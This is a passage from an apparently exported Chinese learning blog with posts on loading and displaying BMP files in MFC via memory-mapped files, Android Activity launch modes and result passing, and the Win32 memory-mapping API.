<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> CStudy_BMPDlg::OnCreate(LPCREATESTRUCT lpCreateStruct)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (CDialogEx::OnCreate(lpCreateStruct) == <span class="number">-1</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	<span class="function">CClientDC <span class="title">dc</span><span class="params">(<span class="keyword">this</span>)</span></span>;</span><br><span class="line">	m_hMemDC = CreateCompatibleDC(dc);</span><br><span class="line">	m_nHeight = <span class="number">0</span>;</span><br><span class="line">	m_nWidth = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span>  在此添加您专用的创建代码</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后我们将图片的宽高都设置为0。<br>对了，还是先看看我是怎么声明一些的变量的得吧：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	HDC m_hMemDC;</span><br><span class="line">	<span class="keyword">int</span> m_nHeight;</span><br><span class="line">	<span class="keyword">int</span> m_nWidth;</span><br></pre></td></tr></table></figure>
<p>这个的话呢，一个是存放我们客户去大小的兼容DC，一个是BMP图片的宽和高。<br>创建写好之后，我们在销毁的时候不要忘记删除掉我们的DC对象，但是不是普通的<code>delete</code>而是用<code>DeleteDC</code>这个函数进行删除。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> CStudy_BMPDlg::OnDestroy()</span><br><span class="line">&#123;</span><br><span class="line">	CDialogEx::OnDestroy();</span><br><span class="line">	DeleteDC(m_hMemDC);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个点击完毕之后，我们可以加一个按钮或者说加一个菜单，这里我为了简单，我就加了一个按钮，但效果的话呢没有加菜单好一些。</p>
<p>按钮点击：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> CStudy_BMPDlg::OnBnClickedButton1()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="function">CFileDialog <span class="title">file</span><span class="params">(TRUE)</span></span>;</span><br><span class="line">	<span class="keyword">if</span> (!file.DoModal())</span><br><span class="line">		<span class="keyword">return</span> ;</span><br><span class="line">	HANDLE hFile = CreateFile(file.GetPathName(),GENERIC_READ,FILE_SHARE_READ,<span class="literal">NULL</span>,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,<span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line">		MessageBox(file.GetPathName()+<span class="string">":File Open Fail"</span>);</span><br><span class="line">		<span class="keyword">return</span> ;</span><br><span class="line">	&#125;</span><br><span class="line">	HANDLE hMap = CreateFileMapping(hFile,<span class="literal">NULL</span>,PAGE_READONLY,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">	LPVOID lpBase = MapViewOfFile(hMap,FILE_MAP_READ,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">	BITMAPFILEHEADER *pFileHeader = (BITMAPFILEHEADER *)lpBase;</span><br><span class="line">	<span class="keyword">if</span> (pFileHeader-&gt;bfType != MAKEWORD(<span class="string">'B'</span>,<span class="string">'M'</span>))<span class="comment">//MAKEWORD这个宏看名字就能看出来，就是把一个放在高位，一个放在低位形成一个WORD类型的数据，这句话就是判断是不是BMP文件</span></span><br><span class="line">	&#123;</span><br><span class="line">		MessageBox(<span class="string">"打开BMP文件啊老哥！"</span>);</span><br><span class="line">		UnmapViewOfFile(lpBase);</span><br><span class="line">		CloseHandle(hMap);</span><br><span class="line">		CloseHandle(hFile);</span><br><span class="line">		<span class="keyword">return</span> ;</span><br><span class="line">	&#125;</span><br><span class="line">	BYTE *pBits = (BYTE*)lpBase+pFileHeader-&gt;bfOffBits;</span><br><span class="line">	BITMAPINFO *pInfoHeader = (BITMAPINFO *)((BYTE*)lpBase+<span class="keyword">sizeof</span>(BITMAPFILEHEADER));</span><br><span class="line">	m_nHeight = <span class="built_in">abs</span>(pInfoHeader-&gt;bmiHeader.biHeight);</span><br><span class="line">	m_nWidth = <span class="built_in">abs</span>(pInfoHeader-&gt;bmiHeader.biWidth);</span><br><span class="line">	<span class="function">CClientDC <span class="title">dc</span><span class="params">(<span class="keyword">this</span>)</span></span>;</span><br><span class="line">	HBITMAP hBitmap = CreateCompatibleBitmap(dc,m_nWidth,m_nHeight);</span><br><span class="line">	<span class="keyword">if</span>(SelectObject(m_hMemDC,hBitmap) == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		UnmapViewOfFile(lpBase);</span><br><span class="line">		CloseHandle(hMap);</span><br><span class="line">		CloseHandle(hFile);</span><br><span class="line">		MessageBox(<span class="string">"选择对象失败"</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span> nRet = SetDIBitsToDevice(m_hMemDC,<span class="number">0</span>,<span class="number">0</span>,m_nWidth,m_nHeight,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,m_nHeight,pBits,pInfoHeader,DIB_RGB_COLORS);</span><br><span class="line">	<span class="keyword">if</span> (!nRet)</span><br><span class="line">		MessageBox(<span class="string">"映射失败"</span>);</span><br><span class="line">	InvalidateRect(<span class="literal">NULL</span>,TRUE);</span><br><span class="line">	UnmapViewOfFile(lpBase);</span><br><span class="line">	CloseHandle(hMap);</span><br><span class="line">	CloseHandle(hFile);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我们就需要说一下，首先我们先用通用对话框打开一个文件，但是不知道是我电脑还是什么情况，书上写的是<code>GetFileName</code>，但是这个的话呢只是获取文件的名字啊，不在一个目录下的话呢相对路径是找不到的，所以我就用了<code>GetPathName</code>这个函数，然后我们就用<code>CreateFile</code>打开一个文件，常规的打开属性就可以了，打开之后我们就开始我们的正题了，就是进行文件的内存映射操作，首先可定时创建一个文件内存映射，由于我们不需要进行内存的共享，所以最后一个参数可以设置为NULL，然后将映射的这块进行分配内存，分配完毕之后我们将这块内存给我们之前说的第一个BMP结构体，这个时候我们就需要用bfType判断一下是不是开头BM了，这个我在注释上详细说了，大家看注释就好了，然后如果不是BMP文件我们就关闭打开的东西，确定是BMP文件之后，我们给一个<code>BYTE</code>的指针，主要是用来保存我们的真是图片数据的，这个图片数据是基地址+相对偏移进行计算出来的，然后我们计算我们的文件信息的地址，这个地址比较有意思，就是说我们第一个结构体紧随其后的就是他，我们只需要用基地址加上第一个BMP结构体的大小就可以计算出来他的一个内存地址了，计算出来之后，在我们获取宽和高的时候问题就来了，在用QQ进行截图生成的BMP文件的时候我在测试过程中，一直出错，不知道原因，慢慢多测试了几次，往上回溯了几次，发现为什么我的高是个负数？我现在也没明白，所以不得不我加上了一个取绝对值的函数，这样就就算可以了，之后我们在创建一个兼容的位图，用来存储我们的图片数据，和我们的客户区DC相兼容，然后将获取到的BMP句柄选入DC，之后我们需要将数据进行拷贝，用到了<code>SetDIBitsToDevice</code>这个函数，就是将数据传输给我们的设备对象：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">SetDIBitsToDevice</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HDC hdc,              <span class="comment">// handle to device context</span></span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">int</span> XDest,            <span class="comment">// x-coordinate of upper-left corner of </span></span></span></span><br><span class="line"><span class="function"><span class="params">                        <span class="comment">// dest. rect.</span></span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">int</span> YDest,            <span class="comment">// y-coordinate of upper-left corner of </span></span></span></span><br><span class="line"><span class="function"><span class="params">                        <span class="comment">// dest. rect.</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwWidth,        <span class="comment">// source rectangle width</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwHeight,       <span class="comment">// source rectangle height</span></span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">int</span> XSrc,             <span class="comment">// x-coordinate of lower-left corner of </span></span></span></span><br><span class="line"><span class="function"><span class="params">                        <span class="comment">// source rect.</span></span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">int</span> YSrc,             <span class="comment">// y-coordinate of lower-left corner of </span></span></span></span><br><span class="line"><span class="function"><span class="params">                        <span class="comment">// source rect.</span></span></span></span><br><span class="line"><span class="function"><span class="params">  UINT uStartScan,      <span class="comment">// first scan line in array</span></span></span></span><br><span class="line"><span class="function"><span class="params">  UINT cScanLines,      <span class="comment">// number of scan lines</span></span></span></span><br><span class="line"><span class="function"><span class="params">  CONST VOID *lpvBits,  <span class="comment">// address of array with DIB bits</span></span></span></span><br><span class="line"><span class="function"><span class="params">  CONST BITMAPINFO *lpbmi,  <span class="comment">// address of structure with bitmap info.</span></span></span></span><br><span class="line"><span class="function"><span class="params">  UINT fuColorUse       <span class="comment">// RGB or palette indexes</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>很好理解，倒数第二个参数就是我们的BMP结构信息，最后一个参数：</p>
<table>
<thead>
<tr>
<th>Value</th>
<th>Meaning</th>
</tr>
</thead>
<tbody><tr>
<td>DIB_PAL_COLORS</td>
<td>The color table consists of an array of 16-bit indexes into the currently selected logical palette.</td>
</tr>
<tr>
<td>DIB_RGB_COLORS</td>
<td>The color table contains literal RGB values</td>
</tr>
</tbody></table>
<p>我们就选择RGB，之后我们就需要关闭各种东西啦，然后使客户区无效。<br>然后在OnPaint中编写：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> CStudy_BMPDlg::OnPaint()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="function">CPaintDC <span class="title">dc</span><span class="params">(<span class="keyword">this</span>)</span></span>;</span><br><span class="line">	BitBlt(dc,<span class="number">0</span>,<span class="number">0</span>,m_nWidth,m_nHeight,m_hMemDC,<span class="number">0</span>,<span class="number">0</span>,SRCCOPY);</span><br><span class="line">	<span class="keyword">if</span> (IsIconic())</span><br><span class="line">	&#123;</span><br><span class="line">		 <span class="comment">// 用于绘制的设备上下文</span></span><br><span class="line"></span><br><span class="line">		SendMessage(WM_ICONERASEBKGND, <span class="keyword">reinterpret_cast</span>&lt;WPARAM&gt;(dc.GetSafeHdc()), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 使图标在工作区矩形中居中</span></span><br><span class="line">		<span class="keyword">int</span> cxIcon = GetSystemMetrics(SM_CXICON);</span><br><span class="line">		<span class="keyword">int</span> cyIcon = GetSystemMetrics(SM_CYICON);</span><br><span class="line">		CRect rect;</span><br><span class="line">		GetClientRect(&amp;rect);</span><br><span class="line">		<span class="keyword">int</span> x = (rect.Width() - cxIcon + <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">		<span class="keyword">int</span> y = (rect.Height() - cyIcon + <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 绘制图标</span></span><br><span class="line">		dc.DrawIcon(x, y, m_hIcon);		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		CDialogEx::OnPaint();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>不要忘记一点就好了要写在外面，判断不一定进去的，这样我们就写好了我们的BMP浏览。<br><code>BitBlt</code>就是一个数据拷贝的函数：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">BitBlt</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HDC hdcDest, <span class="comment">// handle to destination device context</span></span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">int</span> nXDest,  <span class="comment">// x-coordinate of destination rectangle's upper-left </span></span></span></span><br><span class="line"><span class="function"><span class="params">               <span class="comment">// corner</span></span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">int</span> nYDest,  <span class="comment">// y-coordinate of destination rectangle's upper-left </span></span></span></span><br><span class="line"><span class="function"><span class="params">               <span class="comment">// corner</span></span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">int</span> nWidth,  <span class="comment">// width of destination rectangle</span></span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">int</span> nHeight, <span class="comment">// height of destination rectangle</span></span></span></span><br><span class="line"><span class="function"><span class="params">  HDC hdcSrc,  <span class="comment">// handle to source device context</span></span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">int</span> nXSrc,   <span class="comment">// x-coordinate of source rectangle's upper-left </span></span></span></span><br><span class="line"><span class="function"><span class="params">               <span class="comment">// corner</span></span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">int</span> nYSrc,   <span class="comment">// y-coordinate of source rectangle's upper-left </span></span></span></span><br><span class="line"><span class="function"><span class="params">               <span class="comment">// corner</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwRop  <span class="comment">// raster operation code</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>MFC</category>
      </categories>
      <tags>
        <tag>MFC</tag>
      </tags>
  </entry>
  <entry>
    <title>Activity启动模式</title>
    <url>/2020/01/30/Activity%E5%90%AF%E5%8A%A8%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="Activity启动模式"><a href="#Activity启动模式" class="headerlink" title="Activity启动模式"></a>Activity启动模式</h1><p>Activity启动模式分为四种，四种都是比较特别的（除了第一种，因为他就是默认的），下面一一的介绍一下。</p>
<h2 id="standard启动模式"><a href="#standard启动模式" class="headerlink" title="standard启动模式"></a>standard启动模式</h2><p>这个启动模式就是默认的，我们可以声明，也可以不声明，但在这个地方我还是声明一下来演示怎么声明，其实也很简单在我们的Activity节点中加一个属性，就是：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">android:launchMode="standard"</span><br></pre></td></tr></table></figure>
<p>其实就是一个launchMode的设置，这个模式的特点就是说在这个窗口栈中我们的窗口是一个一个叠加的在上面的完全遵守这个规则。</p>
<h2 id="singleTop启动模式"><a href="#singleTop启动模式" class="headerlink" title="singleTop启动模式"></a>singleTop启动模式</h2><p>这个模式有一点点的特殊，就是说如果singleTop的窗口当前为栈顶的话呢，我们在此打开这个singleTop窗口的话呢其实是不创建新的窗口的，就像是我们打开：A-&gt;B-&gt;B的打开方式，实际上是A-&gt;B（B是singleTop），最后一次其实没有打开，但是虽然没有调用onCreate方法，但是我们却调用了别的一个方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onNewIntent</span><span class="params">(Intent intent)</span> </span>&#123;</span><br><span class="line">	<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">	<span class="keyword">super</span>.onNewIntent(intent);</span><br><span class="line">	Log.d(<span class="string">"aaa"</span>, <span class="string">"666"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>就是在我们singleTop在栈顶的时候我们再打开这个窗口我们就会调用这个方法，主要区分是不是重复调用的我感觉。</p>
<h2 id="singleTask启动模式"><a href="#singleTask启动模式" class="headerlink" title="singleTask启动模式"></a>singleTask启动模式</h2><p>这个模式也还是比较特殊的，理解起来也比较好理解，比如说我们的打开顺序是这个样子的：A-&gt;B-&gt;C-&gt;B，那么最终是：A-&gt;B（B是singleTask），其实就是说我们的singleTask如果在栈中存在了的话呢，我们再次加载他，那么原先在他之上的窗口都将被销毁，然后调用哪个<code>onNewIntent</code>方法，也还是比较好理解的。</p>
<h2 id="singleInstance启动模式"><a href="#singleInstance启动模式" class="headerlink" title="singleInstance启动模式"></a>singleInstance启动模式</h2><p>这个模式最特殊我感觉，就是说我们在这个程序的窗口栈中，那么我们打开这个模式的窗口，这个模式不会加入这个栈中，而是自己重新建一个栈，就他这一个实例。</p>
<h3 id="getTaskId"><a href="#getTaskId" class="headerlink" title="getTaskId"></a><code>getTaskId</code></h3><p>这个东西就是说用来获取当前窗口栈的编号。</p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Activity返回数据</title>
    <url>/2020/01/30/Activity%E8%BF%94%E5%9B%9E%E6%95%B0%E6%8D%AE/</url>
    <content><![CDATA[<h1 id="从Activity返回数据"><a href="#从Activity返回数据" class="headerlink" title="从Activity返回数据"></a>从Activity返回数据</h1><p>一开始我认为这个东西就和模态对话框差不多有返回值的，但再看一下由于安卓的限制，这个东西还是比那个强大一点的。<br>这个东西即使比较广泛，获取的数据分为两种，请求码（requestCode）与结果码（resultCode），这两个东西我一开是有点混，主要是不知道请求码的意义，现在明白了，但还是不是很管用，那么现在就分析一下。</p>
<h2 id="请求码"><a href="#请求码" class="headerlink" title="请求码"></a>请求码</h2><p>这个东西主要使用来告诉安卓，我们是点击的哪个按钮来打开一个新的窗口的，就比如说有两个按钮，我们打开同一个Activity，返回来的时候我们想知道到底是哪个点开的哪个界面，这个时候我们就要在打开的时候传递一个特定的请求码，例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">intent.setClass(MainActivity.<span class="keyword">this</span>, activity<span class="class">.<span class="keyword">class</span>)</span>;<span class="comment">//packageContext上下文</span></span><br><span class="line">startActivityForResult(intent, <span class="number">1</span>);<span class="comment">//requestCode是一个请求码</span></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">intent.setClass(MainActivity.<span class="keyword">this</span>, activity<span class="class">.<span class="keyword">class</span>)</span>;<span class="comment">//packageContext上下文</span></span><br><span class="line">startActivityForResult(intent, <span class="number">2</span>);<span class="comment">//requestCode是一个请求码</span></span><br></pre></td></tr></table></figure>
<p>我们用到了一个新的方法这个方法就是用来请求Activity的，并且我们要求又返回数据，当我们在新的Activity操作完毕之后，我们点击返回的时候我们就需要获取这个数据，我们需要重写<code>onActivityResult</code>方法，主要是用来获取数据的，具体写法看下面示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onActivityResult</span><span class="params">(<span class="keyword">int</span> requestCode, <span class="keyword">int</span> resultCode, Intent data)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">super</span>.onActivityResult(requestCode, resultCode, data);</span><br><span class="line">	<span class="keyword">if</span> (data != <span class="keyword">null</span>) &#123;</span><br><span class="line">		<span class="keyword">switch</span> (requestCode) &#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">			Bundle bundle = data.getExtras();</span><br><span class="line">			Log.d(<span class="string">"Q1"</span>, bundle.getString(<span class="string">"Name"</span>));</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">			Bundle bundle2 = data.getExtras();</span><br><span class="line">			Log.d(<span class="string">"Q2"</span>, bundle2.getString(<span class="string">"Name"</span>));</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">/*switch (resultCode) &#123;</span></span><br><span class="line"><span class="comment">		case 1:</span></span><br><span class="line"><span class="comment">			Bundle bundle = data.getExtras();</span></span><br><span class="line"><span class="comment">			Log.d("R1", bundle.getString("Name"));</span></span><br><span class="line"><span class="comment">			break;</span></span><br><span class="line"><span class="comment">		case 2:</span></span><br><span class="line"><span class="comment">			Bundle bundle2 = data.getExtras();</span></span><br><span class="line"><span class="comment">			Log.d("R2", bundle2.getString("Name"));</span></span><br><span class="line"><span class="comment">			break;</span></span><br><span class="line"><span class="comment">		default:</span></span><br><span class="line"><span class="comment">			break;</span></span><br><span class="line"><span class="comment">		&#125;*/</span></span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，我们在按钮点击事件的时候我们传入的请求码<strong>1和2</strong>我们这个响应中我们需要处理，然后做相关的操作。</p>
<h2 id="结果码"><a href="#结果码" class="headerlink" title="结果码"></a>结果码</h2><p>这个主要是操作完毕进行处理的，操作完毕相应的时候我们获取的，我们设置一个button是用来返回的（例如保存），这个时候我们就可以进行判断（有两个按钮，一个保存一个取消这个样子的我们需要进行处理），我们的<code>onActivityResult</code>方法这么写：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onActivityResult</span><span class="params">(<span class="keyword">int</span> requestCode, <span class="keyword">int</span> resultCode, Intent data)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">super</span>.onActivityResult(requestCode, resultCode, data);</span><br><span class="line">	<span class="keyword">if</span> (data != <span class="keyword">null</span>) &#123;</span><br><span class="line">		<span class="comment">/*switch (requestCode) &#123;</span></span><br><span class="line"><span class="comment">		case 1:</span></span><br><span class="line"><span class="comment">			Bundle bundle = data.getExtras();</span></span><br><span class="line"><span class="comment">			Log.d("Q1", bundle.getString("Name"));</span></span><br><span class="line"><span class="comment">			break;</span></span><br><span class="line"><span class="comment">		case 2:</span></span><br><span class="line"><span class="comment">			Bundle bundle2 = data.getExtras();</span></span><br><span class="line"><span class="comment">			Log.d("Q2", bundle2.getString("Name"));</span></span><br><span class="line"><span class="comment">			break;</span></span><br><span class="line"><span class="comment">		default:</span></span><br><span class="line"><span class="comment">			break;</span></span><br><span class="line"><span class="comment">		&#125;*/</span></span><br><span class="line">		<span class="keyword">switch</span> (resultCode) &#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">			Bundle bundle = data.getExtras();</span><br><span class="line">			Log.d(<span class="string">"R1"</span>, bundle.getString(<span class="string">"Name"</span>));</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">			Bundle bundle2 = data.getExtras();</span><br><span class="line">			Log.d(<span class="string">"R2"</span>, bundle2.getString(<span class="string">"Name"</span>));</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这就是相应，那么我们在点击保存的时候怎么写呢？</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">intent.putExtra(<span class="string">"Name"</span>, <span class="string">"Wker"</span>);</span><br><span class="line">setResult(<span class="number">1</span>,intent);</span><br><span class="line">finish();<span class="comment">//关闭当前的Activity，回到上一层</span></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">intent.putExtra(<span class="string">"Name"</span>, <span class="string">"Wker"</span>);</span><br><span class="line">setResult(<span class="number">2</span>,intent);</span><br><span class="line">finish();<span class="comment">//关闭当前的Activity，回到上一层</span></span><br></pre></td></tr></table></figure>
<p>这个Intent只是用来传输数据的！</p>
<p>这个时候我们就能够进行数据返回的一个操作了，但是在这里有一点一定要注意，可能注意到我判断了一下data是否为null，因为在我们没有点击保存或者取消的时候我们之间点的是返回，所以我们并没有传输数据，这个时候很明显的就是会报一个空指针的错误，我们需要判断是不是空指针才能进行打印。</p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>内存映射文件1</title>
    <url>/2020/01/29/%E5%86%85%E5%AD%98%E6%98%A0%E5%B0%84%E6%96%87%E4%BB%B61/</url>
    <content><![CDATA[<h1 id="内存映射"><a href="#内存映射" class="headerlink" title="内存映射"></a>内存映射</h1><p>这个可以是一个很厉害的技术，之前学过很多次相关的只是，但是都是有一些遗忘，这一次重新认真的学习一下。<br>与虚拟内存相比，内存映射提交到物理存储器的是来自于磁盘上的相应文件而不是系统页面文件，一旦被映射了就相当于整个文件被映射了过来，虚拟内存的页面文件我记得也就是页面大小的几倍（叫做什么粒度我也忘记了）</p>
<h2 id="内存映射的目的"><a href="#内存映射的目的" class="headerlink" title="内存映射的目的"></a>内存映射的目的</h2><ol>
<li>内存映射加载EXE和DLL，极大地缩短了启动的时间。</li>
<li>访问磁盘上的数据，避免了执行I/O操作，也避免了文件的内容申请缓冲区</li>
<li>内存之间的数据传输，像什么管道啊，油槽啊之类的各种东西好像都是基于内存映射的。</li>
</ol>
<ul>
<li>CreateFileMapping  </li>
<li>FlushViewOfFile  </li>
<li>MapViewOfFile  </li>
<li>MapViewOfFileEx  </li>
<li>MapViewOfFileVlm  </li>
<li>OpenFileMapping  </li>
<li>UnmapViewOfFile   </li>
<li>UnmapViewOfFileVlm  </li>
</ul>
<p>基本上就这么几个，我还是准备分几篇博客写这个东西</p>
<h2 id="创建一个内存映射内核对象CreateFileMapping"><a href="#创建一个内存映射内核对象CreateFileMapping" class="headerlink" title="创建一个内存映射内核对象CreateFileMapping"></a>创建一个内存映射内核对象<code>CreateFileMapping</code></h2><p><code>CreateFileMapping</code>创建一个内核对象，函数的原型：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateFileMapping</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hFile,              <span class="comment">// handle to file to map</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPSECURITY_ATTRIBUTES lpFileMappingAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">                             <span class="comment">// optional security attributes</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD flProtect,           <span class="comment">// protection for mapping object</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwMaximumSizeHigh,   <span class="comment">// high-order 32 bits of object size</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwMaximumSizeLow,    <span class="comment">// low-order 32 bits of object size</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCTSTR lpName             <span class="comment">// name of file-mapping object</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<ol>
<li>hFile如果是传给他一个<code>CreateFile</code>的HANDLE对象的话呢，那将是打开这个文件，如果是-1的话呢，那将创建一个内存映射。</li>
<li>第三个参数是内存映射文件的保护属性，主要是下面这三值：<code>PAGE_READONLY</code> <code>PAGE_READWRITE</code> <code>PAGE_WRITECOPY</code>看名字就知道了。</li>
<li>三四个参数的话呢是大小，一半给他0，就是和文件一样大。</li>
<li>最后一个是内存映射文件的名字</li>
</ol>
<h2 id="打开内存映射文件OpenFileMapping"><a href="#打开内存映射文件OpenFileMapping" class="headerlink" title="打开内存映射文件OpenFileMapping"></a>打开内存映射文件<code>OpenFileMapping</code></h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">OpenFileMapping</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwDesiredAccess,  <span class="comment">// access mode</span></span></span></span><br><span class="line"><span class="function"><span class="params">  BOOL bInheritHandle,    <span class="comment">// inherit flag</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCTSTR lpName          <span class="comment">// pointer to name of file-mapping object</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<ol>
<li><p>第一个参数<code>dwDesiredAccess</code>就和那个打开文件感觉很像。</p>
<ul>
<li>FILE_MAP_WRITE Read-write access. The target file-mapping object must have been created with PAGE_READWRITE protection. A read-write view of the file is mapped. </li>
<li>FILE_MAP_READ Read-only access. The target file-mapping object must have been created with PAGE_READWRITE or PAGE_READ protection. A read-only view of the file is mapped. </li>
<li>FILE_MAP_ALL_ACCESS Same as FILE_MAP_WRITE. </li>
<li>FILE_MAP_COPY Copy-on-write access. The target file-mapping object must have been created with PAGE_WRITECOPY protection. A copy-on-write view of the file is mapped. </li>
</ul>
</li>
<li><p>第二个参数和之前那个一样就是询问一下可不可以继承</p>
</li>
<li><p>就是创建内核对象时候的名称</p>
</li>
</ol>
<p>返回文件打开的一个句柄，失败返回NULL</p>
<h2 id="分配内存地址MapViewOfFile"><a href="#分配内存地址MapViewOfFile" class="headerlink" title="分配内存地址MapViewOfFile"></a>分配内存地址<code>MapViewOfFile</code></h2><p>下一步就是为内存映射文件线性内存地址（其实就是给他一块内存），函数原型：</p>
